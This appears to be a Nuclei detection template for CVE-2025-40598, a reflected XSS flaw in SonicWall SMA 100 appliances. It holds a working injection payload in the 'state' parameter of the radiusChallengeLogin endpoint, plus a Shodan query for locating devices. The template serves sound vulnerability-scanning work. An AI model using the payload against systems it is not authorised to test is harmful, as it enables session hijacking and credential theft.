id: CVE-2025-40598

info:
  name: SonicWall SMA 100 - Web Interface Cross Site Scripting
  author: watchtowr,DhiyaneshDK
  severity: medium
  description: |
    A reflected cross-site scripting (XSS) vulnerability exists in the SMA100 series web interface, allowing a remote unauthenticated attacker to potentially execute arbitrary JavaScript code.
  impact: |
    Successful exploitation could allow an attacker to execute arbitrary JavaScript code in the context of the victim's browser, potentially leading to session hijacking, credential theft, or other malicious activities.
  remediation: |
    Apply the latest security patches or updates provided by SonicWall to mitigate this vulnerability.
  reference:
    - https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2025-0012
    - https://labs.watchtowr.com/stack-overflows-heap-overflows-and-existential-dread-sonicwall-sma100-cve-2025-40596-cve-2025-40597-and-cve-2025-40598/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2025-40598
    cwe-id: CWE-79
  metadata:
    verified: true
    max-request: 1
    vendor: sonicwall
    product: sma_100_firmware
    shodan-query: intitle:"sonicwall"
  tags: cve,cve2025,xss,sonicwall,sma100

http:
  - method: GET
    path:
      - "{{BaseURL}}/cgi-bin/radiusChallengeLogin?portalName=portal1&status=needchallenge&state=\"><img/src=x+onerror=alert`1`>"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"><img/src=x+onerror=alert`1`>'
          - 'SMA'
        condition: and

      - type: word
        part: content_type
        words:
          - 'text/html'
